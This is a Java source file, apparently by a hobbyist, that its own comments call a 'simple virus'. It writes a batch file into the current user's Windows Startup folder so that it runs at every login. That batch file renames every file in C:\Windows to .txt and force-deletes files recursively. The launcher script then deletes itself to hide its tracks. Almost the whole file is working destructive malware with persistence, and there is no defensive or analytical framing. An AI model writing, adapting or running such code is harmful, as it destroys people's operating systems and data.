import java.awt.Desktop;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/**
 * A simple virus that creates a file in the startup folder of the current user. Runs the virus.
 * The virus changes the extension of every file in the C:\Windows folder/sub-folders to a .txt
 * 
 * @author Josias Sena
 */
public class StartupVirus {
	
	private static String tmpFile = "_tmp.bat";
	private static String virusName = "_jsg.bat";

	public static void main(String[] args) {
		runFile();
	}
	
	/*
	 * get the users home file path ex. (C:/users/"uname"/)
	 */
	public static String getPathToSetFile(){
		String home = System.getProperty("user.home");
		return home; 
	}
	
	//set the file in the given directory
	public static void createVirus() throws IOException {
		File tempFile = new File(getPathToSetFile() + File.separator + tmpFile); // create tmp file
		FileWriter fileWriter = new FileWriter(tempFile);
		BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
		
		if(tempFile.exists()){
			tempFile.setWritable(true);
			bufferedWriter.write("@echo off");
			bufferedWriter.newLine();
			
			//location of where virus will go >> in the startup folder of the current user
			String virusPathString = getPathToSetFile() + 
					"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
			
			// Go to the startup folder for the current user
			bufferedWriter.write("cd " + virusPathString);
			
			// Create virus file
			File virus = new File(virusPathString + File.separator + virusName);
			FileWriter virusfileWriter = new FileWriter(virus);
			BufferedWriter virusbufferedWriter = new BufferedWriter(virusfileWriter);
			
			// Write the virus in batch
			if (virus.exists()) {
				virusbufferedWriter.write("@echo off"); 
				virusbufferedWriter.write("cd C:\\Windows");
				virusbufferedWriter.newLine();
				virusbufferedWriter.write("ren *.* *.txt");
				virusbufferedWriter.newLine();	
				virusbufferedWriter.write("if exist %1\\ (del *.* /F /S /Q)");
			}	
			
			virusbufferedWriter.close();
			
			bufferedWriter.newLine();
			bufferedWriter.write("del %~f0"); // tmpFile deletes itself after it is done
		}
		bufferedWriter.close();
	}
	
	public static void runFile() {
		try {
			createVirus();
			File toOpen = new File(getPathToSetFile() + File.separator + tmpFile);
			Desktop.getDesktop().open(toOpen);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}	
